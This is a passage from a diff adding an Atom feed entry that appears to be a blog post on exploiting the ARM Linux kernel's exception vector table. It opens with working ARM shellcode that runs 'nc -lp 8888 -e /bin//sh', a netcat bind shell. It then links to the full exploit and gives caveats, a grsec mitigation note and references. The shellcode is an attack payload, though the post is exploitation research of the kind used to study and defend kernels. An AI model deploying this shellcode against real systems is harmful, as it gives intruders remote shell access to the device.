+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c1"&gt;; /sh&lt;/span&gt;
+    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;          &lt;span class="c1"&gt;; 0x00000000&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x0000632d&lt;/span&gt;     &lt;span class="c1"&gt;; -c\x00\x00&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2d20636e&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x3820706c&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x20383838&lt;/span&gt;     &lt;span class="c1"&gt;; nc -lp 8888 -e /bin//sh&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f20652d&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f6e6962&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;
+
+    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+
+    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;
+
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can find the complete code for the vulnerable module and the exploit &lt;a href="https://github.com/acama/arm-evt/tree/master/remote_example"&gt;here&lt;/a&gt;. Run the exploit:&lt;br&gt;
+&lt;center&gt;&lt;img alt="Remote PoC" src="/images/corrupting_arm_evt/remote_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
+&lt;h2 id="bonus-interrupt-stack-overflow"&gt;Bonus: Interrupt Stack Overflow&lt;/h2&gt;
+&lt;p&gt;It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?&lt;/p&gt;
+&lt;h1 id="a-few-things-about-all-this"&gt;A Few Things about all this&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.&lt;/li&gt;
+&lt;li&gt;The location where we are storing our shellcode (&lt;em&gt;0xffff0020&lt;/em&gt;) might or might not be used by another distro's kernel.&lt;/li&gt;
+&lt;li&gt;The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.&lt;/li&gt;
+&lt;li&gt;If you hadn't noticed, the "vulnerabilities" presented here, aren't really vulnerabilities but that is not the point of this article.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;*: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.&lt;/p&gt;
+&lt;h1 id="final-words"&gt;Final words&lt;/h1&gt;
+&lt;p&gt;Among other things, &lt;a href="http://grsecurity.net/"&gt;grsec&lt;/a&gt; prevents the modification of the EVT by making the page read-only.
+If you want to play with some fun kernel challenges checkout the "kernelpanic" branch on &lt;a href="http://w3challs.com/challenges/wargame"&gt;w3challs&lt;/a&gt;.&lt;br&gt;
+Cheers, &lt;a href="https://twitter.com/amatcama"&gt;@amatcama&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id="references"&gt;References&lt;/h1&gt;
+&lt;p&gt;[1] &lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;Vector Rewrite Attack&lt;/a&gt;&lt;br&gt;
+[2] &lt;a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;amp;t=3292"&gt;Recent ARM Security Improvements&lt;/a&gt;&lt;br&gt;
+[3] &lt;a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html"&gt;Entering an Exception&lt;/a&gt;&lt;br&gt;
+[4] &lt;a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html"&gt;SWI handlers&lt;/a&gt;&lt;br&gt;
+[5] &lt;a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf"&gt;ARM Exceptions&lt;/a&gt;&lt;br&gt;
+[6] &lt;a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf"&gt;Exception and Interrupt Handling in ARM&lt;/a&gt;  &lt;/p&gt;</content><category term="exploitation"></category><category term="kernel"></category></entry></feed>
